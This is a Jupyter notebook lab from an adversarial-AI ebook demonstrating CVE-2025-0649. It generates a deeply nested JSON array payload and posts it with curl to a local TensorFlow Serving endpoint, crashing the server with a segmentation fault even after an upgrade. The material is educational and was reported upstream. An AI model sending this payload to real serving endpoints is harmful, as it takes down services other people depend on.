{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d446b115",
   "metadata": {},
   "source": [
    "<img style=\"max-width:20em; height:auto;\" src=\"../graphics/A-Little-Book-on-Adversarial-AI-Cover.png\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f00ea8cc",
   "metadata": {},
   "source": [
    "Author: Nik Alleyne   \n",
    "Author Blog: https://www.securitynik.com   \n",
    "Author GitHub: github.com/securitynik   \n",
    "\n",
    "Author Other Books: [   \n",
    "\n",
    "            \"https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/\",   \n",
    "            \n",
    "            \"https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/\"   \n",
    "        ]   \n",
    "\n",
    "\n",
    "This notebook ***(attacking_tf_serving_dos.ipynb)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a05fcfb8",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "dd488716",
   "metadata": {},
   "source": [
    "### Exploiting TF Serving via DoS  \n",
    "**CVE-2025-0649**\n",
    "https://nvd.nist.gov/vuln/detail/CVE-2025-0649 \n",
    "\n",
    "To ensure we are good to go, let us setup a new docker environment.   \n",
    "\n",
    "Let us start off with setting up a docker file  \n",
    "\n",
    "### Create a directory  \n",
    "In your *tmp* directory, create a folder named **tf_serv_vuln**   \n",
    "We really do not need this, I am just setting a place we can work out of if needed\n",
    "$ **mkdir --parents /tmp/tf_serv_vuln**   \n",
    "\n",
    "Change to the directory   \n",
    "$ **cd /tmp/tf_serv_vuln/**     \n",
    "\n",
    "\n",
    "### Get the docker image  \n",
    "$ **sudo docker pull tensorflow/serving:2.18.0**    \n",
    "\n",
    "### Confirm the image has been added   \n",
    "$ **sudo docker images**   \n",
    "\n",
    "\n",
    "### Lab Objectives:  \n",
    "- Target a known vulnerability in the inference platform \n",
    "- Leverage TFServing for serving models   \n",
    "- Identify how vulnerabilities in the API endpoint can impact availability  \n",
    "- Recognize that all a threat actor needs, is the ability to interact with your environment, then anything is possible.   \n",
    "- Learn some quick docker usage   \n",
    "\n",
    "\n",
    "### Step 1:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "d1c5c538",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2025-07-13 17:59:55.081332: I tensorflow/core/util/port.cc:153] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.\n",
      "2025-07-13 17:59:55.108495: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:467] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered\n",
      "WARNING: All log messages before absl::InitializeLog() is called are written to STDERR\n",
      "E0000 00:00:1752443995.139040   67971 cuda_dnn.cc:8579] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered\n",
      "E0000 00:00:1752443995.148697   67971 cuda_blas.cc:1407] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered\n",
      "W0000 00:00:1752443995.452015   67971 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "W0000 00:00:1752443995.452068   67971 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "W0000 00:00:1752443995.452070   67971 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "W0000 00:00:1752443995.452073   67971 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "2025-07-13 17:59:55.489160: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.\n",
      "To enable the following instructions: AVX2 AVX512F AVX512_VNNI AVX512_BF16 AVX_VNNI FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.\n"
     ]
    }
   ],
   "source": [
    "# Import the libraries\n",
    "\n",
    "import tensorflow as tf\n",
    "from tensorflow import keras\n",
    "from tensorflow.keras import layers\n",
    "import numpy as np\n",
    "from sklearn.datasets import make_classification"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "51ef8d7a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[-] Disabling the GPU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "W0000 00:00:1752444005.895904   67971 gpu_device.cc:2430] TensorFlow was not built with CUDA kernel binaries compatible with compute capability 12.0. CUDA kernels will be jit-compiled from PTX, which could take 30 minutes or longer.\n"
     ]
    }
   ],
   "source": [
    "# On my system, there is a compatibility issue between my Cuda and Tensorflow\n",
    "# As a result I disable the GPU by default for Tensorflow.\n",
    "# If Tensorflow is working fine on your system, then feel free to comment out the lines below\n",
    "\n",
    "# Comment out this line if your GPU works fine in Tensorflow \n",
    "print(f'[-] Disabling the GPU')\n",
    "tf.config.set_visible_devices(devices=[], device_type='GPU')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "837564b2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Tensorflow version used:  2.19.0\n",
      "Numpy version used:  2.1.3\n",
      "keras version used:  3.10.0\n"
     ]
    }
   ],
   "source": [
    "### Version of key libraries used  \n",
    "print(f'Tensorflow version used:  {tf.__version__}')\n",
    "print(f'Numpy version used:  {np.__version__}')\n",
    "print(f'keras version used:  {keras.__version__}')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "22e6d339",
   "metadata": {},
   "source": [
    "To ensure this lab can stand on its own, let's build a simple tensorflow model. This model will also be served"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "164eebbe",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "((100, 4), (100,))"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Get some toy data\n",
    "X_train, y_train = make_classification(n_samples=100, n_features=4, n_classes=2, random_state=10)\n",
    "\n",
    "# Get the shape of the data\n",
    "X_train.shape, y_train.shape"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "42fdb828",
   "metadata": {},
   "source": [
    "Here we build our model   \n",
    "\n",
    "\n",
    "### Step 2:   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "221e5487",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"simple_model\"</span>\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1mModel: \"simple_model\"\u001b[0m\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)            │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">16</span>)             │            <span style=\"color: #00af00; text-decoration-color: #00af00\">80</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ second_hidden (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)           │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">8</span>)              │           <span style=\"color: #00af00; text-decoration-color: #00af00\">136</span> │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                  │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │             <span style=\"color: #00af00; text-decoration-color: #00af00\">9</span> │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
       "</pre>\n"
      ],
      "text/plain": [
       "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
       "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
       "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
       "│ first_hidden (\u001b[38;5;33mDense\u001b[0m)            │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m16\u001b[0m)             │            \u001b[38;5;34m80\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ second_hidden (\u001b[38;5;33mDense\u001b[0m)           │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m8\u001b[0m)              │           \u001b[38;5;34m136\u001b[0m │\n",
       "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
       "│ output (\u001b[38;5;33mDense\u001b[0m)                  │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │             \u001b[38;5;34m9\u001b[0m │\n",
       "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">225</span> (900.00 B)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m225\u001b[0m (900.00 B)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">225</span> (900.00 B)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m225\u001b[0m (900.00 B)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
       "</pre>\n"
      ],
      "text/plain": [
       "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Set the random number generator\n",
    "tf.keras.utils.set_random_seed(10)\n",
    "\n",
    "# Build model\n",
    "model = keras.Sequential([\n",
    "    layers.Input(shape=(4,)),\n",
    "    layers.Dense(units=16, activation='relu', name='first_hidden'),\n",
    "    layers.Dense(units=8, activation='relu', name='second_hidden'),\n",
    "    layers.Dense(units=1, activation='sigmoid', name='output')\n",
    "], name='simple_model')\n",
    "\n",
    "# Get the model summary\n",
    "model.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "a13cb577",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Compile the model\n",
    "model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "25a67084",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch 1/5\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: All log messages before absl::InitializeLog() is called are written to STDERR\n",
      "I0000 00:00:1752444018.628577   68137 service.cc:152] XLA service 0x7fdbcc00b020 initialized for platform Host (this does not guarantee that XLA will be used). Devices:\n",
      "I0000 00:00:1752444018.628810   68137 service.cc:160]   StreamExecutor device (0): Host, Default Version\n",
      "2025-07-13 18:00:18.721902: I tensorflow/compiler/mlir/tensorflow/utils/dump_mlir_util.cc:269] disabling MLIR crash reproducer, set env var `MLIR_CRASH_REPRODUCER_DIRECTORY` to enable.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1m1/4\u001b[0m \u001b[32m━━━━━\u001b[0m\u001b[37m━━━━━━━━━━━━━━━\u001b[0m \u001b[1m6s\u001b[0m 2s/step - accuracy: 0.3125 - loss: 0.8268"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "I0000 00:00:1752444019.702361   68137 device_compiler.h:188] Compiled cluster using XLA!  This line is logged at most once for the lifetime of the process.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1m4/4\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m3s\u001b[0m 179ms/step - accuracy: 0.3450 - loss: 0.7554\n",
      "Epoch 2/5\n",
      "\u001b[1m4/4\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 16ms/step - accuracy: 0.3450 - loss: 0.7398\n",
      "Epoch 3/5\n",
      "\u001b[1m4/4\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 15ms/step - accuracy: 0.3511 - loss: 0.7270\n",
      "Epoch 4/5\n",
      "\u001b[1m4/4\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 14ms/step - accuracy: 0.3511 - loss: 0.7154\n",
      "Epoch 5/5\n",
      "\u001b[1m4/4\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 16ms/step - accuracy: 0.3603 - loss: 0.7047\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<keras.src.callbacks.history.History at 0x7fdf05805e50>"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Train the model for 5 epochs\n",
    "# The accuracy is not important here\n",
    "model.fit(X_train, y_train, epochs=5, batch_size=32)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "53e220d5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 267ms/step\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "array([[0.50004435]], dtype=float32)"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Give the model a sample to make a prediction\n",
    "model.predict(np.array([[0.1, 0.2, 0.3, 0.4]]))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "40389926",
   "metadata": {},
   "source": [
    "With the model built, it has to be exported to be used by our inference endpoint TFServing. We just save it in the temp folder in this case. \n",
    "\n",
    "Notice the *1*, this is important as we need version information also.\n",
    "\n",
    "### Step 3:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "d4cb2613",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: /tmp/models/my_model/1/assets\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Assets written to: /tmp/models/my_model/1/assets\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Saved artifact at '/tmp/models/my_model/1/'. The following endpoints are available:\n",
      "\n",
      "* Endpoint 'serve'\n",
      "  args_0 (POSITIONAL_ONLY): TensorSpec(shape=(None, 4), dtype=tf.float32, name='keras_tensor')\n",
      "Output Type:\n",
      "  TensorSpec(shape=(None, 1), dtype=tf.float32, name=None)\n",
      "Captures:\n",
      "  140595846077840: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
      "  140595846081104: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
      "  140595846079952: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
      "  140595846078416: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
      "  140595846081680: TensorSpec(shape=(), dtype=tf.resource, name=None)\n",
      "  140595846078800: TensorSpec(shape=(), dtype=tf.resource, name=None)\n"
     ]
    }
   ],
   "source": [
    "# Now that we know the model can make predictions let us save it\n",
    "# Save model in TF Serving format (SavedModel) using new Keras 3 method\n",
    "export_path = \"/tmp/models/my_model/1/\"\n",
    "model.export(export_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2a25ef20",
   "metadata": {},
   "source": [
    "If you encounter an error such as \"... tree: command not found\", you will need to install it via.   \n",
    "\n",
    "$ **sudo apt install tree**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "661dd813",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01;34m/tmp/models\u001b[0m\n",
      "└── \u001b[01;34mmy_model\u001b[0m\n",
      "    └── \u001b[01;34m1\u001b[0m\n",
      "        ├── \u001b[01;34massets\u001b[0m\n",
      "        ├── fingerprint.pb\n",
      "        ├── saved_model.pb\n",
      "        └── \u001b[01;34mvariables\u001b[0m\n",
      "            ├── variables.data-00000-of-00001\n",
      "            └── variables.index\n",
      "\n",
      "5 directories, 4 files\n"
     ]
    }
   ],
   "source": [
    "# let us verify the structure of our model\n",
    "!tree /tmp/models"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f9012727",
   "metadata": {},
   "source": [
    "We have our model, we have our structure, we have TF Serving, let us now serve the model.   \n",
    "\n",
    "### Step 4:   "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4b1c7434",
   "metadata": {},
   "source": [
    "With the above in place, let us setup our inference endpoint   \n",
    "**sudo docker run --rm -p 8501:8501 --name=tfserving -v \"/tmp/models/my_model:/models/vuln_tf_serv\" -e MODEL_NAME=vuln_tf_serv  tensorflow/serving:2.18.0**   \n",
    "\n",
    "If this worked as expected you should see something such as   ...\n",
    "\n",
    "2025-07-11 20:40:45.255413: I tensorflow_serving/model_servers/server.cc:423] Running gRPC ModelServer at 0.0.0.0:8500 ...    \n",
    "[warn] getaddrinfo: address family for nodename not supported   \n",
    "2025-07-11 20:40:45.259994: I tensorflow_serving/model_servers/server.cc:444] Exporting HTTP/REST API at:localhost:8501 ...   \n",
    "[evhttp_server.cc : 250] NET_LOG: Entering the event loop ...    "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c38caa8b",
   "metadata": {},
   "source": [
    "To confirm above is good, run   \n",
    "$ **curl http://localhost:8501/v1/models/vuln_tf_serv**   \n",
    "{   \n",
    " \"model_version_status\": [   \n",
    "  {   \n",
    "   \"version\": \"1\",   \n",
    "   \"state\": \"AVAILABLE\",   \n",
    "   \"status\": {   \n",
    "    \"error_code\": \"OK\",   \n",
    "    \"error_message\": \"\"   \n",
    "   }   \n",
    "  }   \n",
    " ]   \n",
    "}   "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3a2c9b5f",
   "metadata": {},
   "source": [
    "Above suggests we are good go. Let us make a prediction.   \n",
    "$  curl --request POST http://localhost:8501/v1/models/vuln_tf_serv:predict --header \"Content-Type: application/json\" --header \"User-agent: Adversarial AI\" -d  '{\"instances\": [[0.1, 0.2, 0.3, 0.4]]}'\n",
    "\n",
    "If above runs successfully, you should see the predictions returned, looking something like:    \n",
    "{   \n",
    "    \"predictions\": [[0.500044346]   \n",
    "    ]   \n",
    "}   \n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a9a1060e",
   "metadata": {},
   "source": [
    "Now that we know the inference endpoint is working as expected, let us target it.   \n",
    "\n",
    "\n",
    "### Step 5:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7346d930",
   "metadata": {},
   "outputs": [],
   "source": [
    "# The information being written to the file is nothing exciting\n",
    "# From a simple perspective, this is what we are doing\n",
    "# Just that the number of brackets is determined by our recurse_depth variable\n",
    "'[' * 10 + '0.5' + ']' * 10"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4db571fb",
   "metadata": {},
   "outputs": [],
   "source": [
    "# How deep should we recurse.\n",
    "# Let us start with 1000\n",
    "recurse_depth = 1000  \n",
    "\n",
    "# Create a file on the file system\n",
    "with open(file=\"/tmp/tf_serv_vuln.json\", mode=\"w\") as f:\n",
    "    # Write to the file\n",
    "    # This information should look similary to what you say earlier\n",
    "    f.write('{\"instances\": ' + ('[' * recurse_depth) + '0.5' + (']' * recurse_depth) + '}')\n",
    "\n",
    "# verify the file has been created \n",
    "!ls /tmp/tf_serv_vuln.json\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "49c39150",
   "metadata": {},
   "source": [
    "With the file now available, let's feed that to tfserving  \n",
    "Note the change we made to the data  **--data-binary @/tmp/tf_serv_vuln.json**\n",
    "curl -X request http://localhost:8501/v1/models/vuln_tf_serv:predict --header \"Content-Type: application/json\" --header \"User-agent: Adversarial AI\" --data-binary @/tmp/tf_serv_vuln.json   \n",
    "\n",
    "At this point, in your console you should see something like:  \n",
    "{\n",
    "    \"error\": \"tensor parsing error: keras_tensor_4\"\n",
    "}\n",
    "\n",
    "\n",
    "The above my suggest that it did not work. However, let us try something else.  \n",
    "\n",
    "Let us increase the recurse depth to 50000. Maybe this will make a difference, maybe it will not. \n",
    "\n",
    "\n",
    "### Step 6:  \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72a44d6f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Increase recurse_depth to 50_000\n",
    "recurse_depth = 50_000  \n",
    "\n",
    "# Create a file on the file system\n",
    "with open(file=\"/tmp/tf_serv_vuln.json\", mode=\"w\") as f:\n",
    "    # Write to the file\n",
    "    # This information should look similary to what you say earlier\n",
    "    f.write('{\"instances\": ' + ('[' * recurse_depth) + '0.5' + (']' * recurse_depth) + '}')\n",
    "\n",
    "# verify the file has been created \n",
    "!ls /tmp/tf_serv_vuln.json\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "88031664",
   "metadata": {},
   "source": [
    "Run the same command again:   \n",
    "curl --request POST http://localhost:8501/v1/models/vuln_tf_serv:predict --header \"Content-Type: application/json\" --header \"User-agent: Adversarial AI\" --data-binary @/tmp/tf_serv_vuln.json\n",
    "\n",
    "This time we see at our Curl command prompt.   \n",
    "\n",
    "$ curl --request POST http://localhost:8501/v1/models/vuln_tf_serv:predict --header \"Content-Type: application/json\" --header \"User-agent: Adversarial AI\"  --data-binary @/tmp/tf_serv_vuln.json\n",
    "curl: (52) Empty reply from server    "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4b6edf83",
   "metadata": {},
   "source": [
    "When we look at the TFServing console we see:  \n",
    "\n",
    "**/usr/bin/tf_serving_entrypoint.sh: line 3:     7 Segmentation fault      (core dumped) tensorflow_model_server --port=8500 --rest_api_port=8501 --model_name=${MODEL_NAME} --model_base_path=${MODEL_BASE_PATH}/${MODEL_NAME} \"$@\"**   \n",
    "\n",
    "We know now we were able to successfully create a denial of service attack against the inference endpoint.  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "39d8b0db",
   "metadata": {},
   "source": [
    "Let us now mitigate this issue by removing this instance of TFServing and installing instead the latest version.   \n",
    "\n",
    "\n",
    "### Step 7:  \n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "75368feb",
   "metadata": {},
   "source": [
    "let us start by removing this version   \n",
    "$ sudo docker images\n",
    "REPOSITORY           TAG       IMAGE ID       CREATED        SIZE   \n",
    "tensorflow/serving   2.18.0    **ccc3b2242411**   8 months ago   711 MB      \n",
    "\n",
    "Removing that image    \n",
    "$ **sudo docker rmi --force ccc3b2242411**\n",
    "Untagged: tensorflow/serving:2.18.0       \n",
    "\n",
    "\n",
    "Remove any unused docker object and free up some space   \n",
    "Realistically we do not have any in this case.\n",
    "So this is just a little trick to use in the future to clean up \n",
    "$ **sudo docker system prune --all --force**    \n",
    "\n",
    "\n",
    "Ensure we are good to go   \n",
    "$ sudo docker images --all\n",
    "REPOSITORY   TAG       IMAGE ID   CREATED   SIZE\n",
    "\n",
    "\n",
    "\n",
    "Get the latest version now. At the time of this writing, this is 2.19.0 \n",
    "$ **sudo docker pull tensorflow/serving:2.19.0**    \n",
    "\n",
    "\n",
    "### Step 8:   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee570089",
   "metadata": {
    "vscode": {
     "languageId": "markdown"
    }
   },
   "outputs": [],
   "source": [
    "Notice the change to **2.19.0** at the end from 2.18.0\n",
    "\n",
    "Verify we got the correct image  \n",
    "$  **sudo docker images --all**   \n",
    "REPOSITORY           TAG       IMAGE ID       CREATED        SIZE   \n",
    "tensorflow/serving   2.19.0    d871e064642e   2 months ago   729MB   \n",
    "\n",
    "\n",
    "Serve the image \n",
    "**sudo docker run --rm -p 8501:8501 --name=tfserving -v \"/tmp/models/my_model:/models/patched_tf_serv\" -e MODEL_NAME=patched_tf_serv  tensorflow/serving:2.19.0**   \n",
    "\n",
    "\n",
    "Verify the server is available:  \n",
    "$ curl http://localhost:8501/v1/models/patched_tf_serv   \n",
    "\n",
    "\n",
    "Validate we can still make predictions   \n",
    "\n",
    "$ curl --request POST http://localhost:8501/v1/models/patched_tf_serv:predict --header \"Content-Type: application/json\" --header \"User-agent: Adversarial AI\" -d '{\"instances\": [[0.1, 0.2, 0.3, 0.4]]}'\n",
    "{\n",
    "    \"predictions\": [[0.481608093]\n",
    "    ]\n",
    "}\n",
    "\n",
    "\n",
    "Finally, can we crash the server again?    \n",
    "Unfortunately it did crash it again.  \n",
    "\n",
    "$curl --request POST \"http://localhost:8501/v1/models/patched_tf_serv:predict\" --header \"Content-Type: application/json\" --header \"User-agent: Adversarial AI\" --data-binary @/tmp/tf_serv_vuln.json\n",
    "curl: (52) Empty reply from server\n",
    "\n",
    "/usr/bin/tf_serving_entrypoint.sh: line 3:     7 Segmentation fault      (core dumped) tensorflow_model_server --port=8500 --rest_api_port=8501 --model_name=${MODEL_NAME} --model_base_path=${MODEL_BASE_PATH}/${MODEL_NAME} \"$@\"\n",
    "\n",
    "\n",
    "I reported this as an issue to the TFServing team. https://github.com/tensorflow/serving/issues/4116.\n",
    "\n",
    "We will see what they come back with.\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "489c2463",
   "metadata": {},
   "source": [
    "### Lab Takeaways:  \n",
    "- We leveraged Tensorflow Serving for serving our model  \n",
    "- We saw this version is vulnerable to a Denial of Service (DoS) attack   \n",
    "- We saw while we were told to upgrade to resolve this issue, that did not work  "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "adversarial_ai",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
